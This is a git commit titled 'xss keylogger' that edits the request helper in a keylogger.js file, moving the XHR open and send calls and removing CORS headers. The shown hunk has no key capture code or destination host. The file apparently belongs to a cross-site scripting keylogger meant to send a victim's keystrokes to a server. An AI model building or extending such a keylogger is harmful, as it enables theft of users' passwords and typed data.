a28db4368ec340f9b24a9efeda458fd1ee3cb762
Duy Nguyen <duy210697@gmail.com>
2019-03-03 02:59:53 +0700

    2019-03-03: xss keylogger

--- public/js/keylogger.js
+++ public/js/keylogger.js
@@ -2,23 +2,18 @@
 function ajaxRequest (method, url, data) {
     var xmlHttp = new XMLHttpRequest()
 
+    xmlHttp.open(method, url, true)
+    // xmlHttp.setRequestHeader('Content-Type', 'application/json');
+
+    xmlHttp.setRequestHeader("Content-type", "application/json");
+    xmlHttp.send(data)
+
     xmlHttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             console.log(this.responseText);
         }
     };
 
-    if (xmlHttp.overrideMimeType) {
-        xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
-    }
-
-    xmlHttp.open(method, url, true)
-    // xmlHttp.setRequestHeader('Content-Type', 'application/json');
-
-    xmlHttp.setRequestHeader("Content-type", "application/json");
-    xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
-    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xmlHttp.send(data)
     return xmlHttp
 }
 
